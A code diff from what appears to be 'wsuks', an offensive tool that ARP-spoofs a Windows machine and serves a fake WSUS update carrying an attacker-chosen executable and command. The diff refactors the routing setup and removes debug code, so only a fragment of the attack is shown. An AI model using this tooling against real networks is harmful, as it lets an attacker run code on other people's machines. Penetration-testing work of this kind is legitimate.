@@ -8,7 +8,7 @@ import os
 from pprint import pformat
 import random
 from string import digits, ascii_letters
-from scapy.all import get_if_addr, sniff, conf, IP, TCP, send
+from scapy.all import get_if_addr
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
@@ -68,21 +68,15 @@ class Wsuks:
         arpspoofer.start(self.targetIp, self.wsusIp)
 
         # Set up routing to route spoofed packages to the local HTTP server
-        router = Router()
-        router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)
+        router = Router(self.targetIp, self.hostIp, self.wsusIp, self.wsusPort, self.interface)
+        router.start()
 
-        
-        # self.logger.debug(conf.route)
-        # conf.route.add(host=self.wsusIp, gw=self.hostIp)
-        # self.logger.debug(conf.route)
-
-
+        # Prepare WSUS HTTP Server
         update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
         update_handler.set_resources_xml(self.command)
 
         self.logger.debug(update_handler)
 
-        # Prepare WSUS HTTP Server
         http_handler = partial(WSUSBaseServer, update_handler)
         http_server = HTTPServer((self.hostIp, self.wsusPort), http_handler)
         try:
@@ -92,15 +86,8 @@ class Wsuks:
             print("")
             self.logger.info("Stopping WSUS Server...")
         finally:
-            # conf.route.resync()
-            # self.logger.debug(conf.route)
-            # router.stop()
             arpspoofer.stop()
-
-    def handlePacket(self, packet):
-        #and (packet[IP].src == self.targetIp or packet[IP].src == self.hostIp or packet[IP].src == self.wsusIp)
-        if IP in packet and TCP in packet and packet[IP].src == self.targetIp:
-            packet.show()
+            router.stop()
 
 
 def main():
